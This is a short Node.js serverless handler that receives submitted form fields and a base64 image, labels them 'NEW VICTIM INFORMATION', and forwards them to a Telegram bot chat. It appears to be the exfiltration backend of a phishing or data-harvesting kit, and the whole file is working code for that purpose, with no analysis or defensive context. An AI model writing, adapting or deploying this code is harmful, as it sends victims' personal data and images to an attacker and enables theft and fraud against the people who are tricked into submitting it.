const https = require('https');
const FormData = require('form-data');
const { Buffer } = require('buffer');

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).send('Method Not Allowed');
    }

    const { usrId, image, ...userData } = req.body;

    // Your Telegram Bot Token
    const botToken = 'YOUR_BOT_TOKEN_HERE';
    const chatId = usrId;

    // Prepare the victim information
    const formatVictimInfo = (data) => {
        let output = "□ NEW VICTIM INFORMATION □\n";
        output += "━━━━━━━━━━•❈•━━━━━━━━━━\n";
        Object.entries(data).forEach(([key, value]) => {
            output += `❯ ${key}: ${value}\n`;
        });
        output += "━━━━━━━━━━•❈•━━━━━━━━━━\n";
        return output;
    };

    const caption = formatVictimInfo(userData);

    // Send the image to Telegram
    try {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('caption', caption);
        if (image) {
            const buffer = Buffer.from(image.split(',')[1], 'base64');
            formData.append('photo', buffer, { filename: 'photo.png' });
        }

        const telegramResponse = await new Promise((resolve, reject) => {
            const request = https.request(
                `https://api.telegram.org/bot${botToken}/sendPhoto`,
                {
                    method: 'POST',
                    headers: formData.getHeaders(),
                },
                (response) => {
                    let data = '';
                    response.on('data', (chunk) => (data += chunk));
                    response.on('end', () => resolve(data));
                }
            );

            request.on('error', reject);
            formData.pipe(request);
        });

        return res.status(200).send(telegramResponse);
    } catch (error) {
        console.error('Error sending message:', error);
        return res.status(500).send('Internal Server Error');
    }
}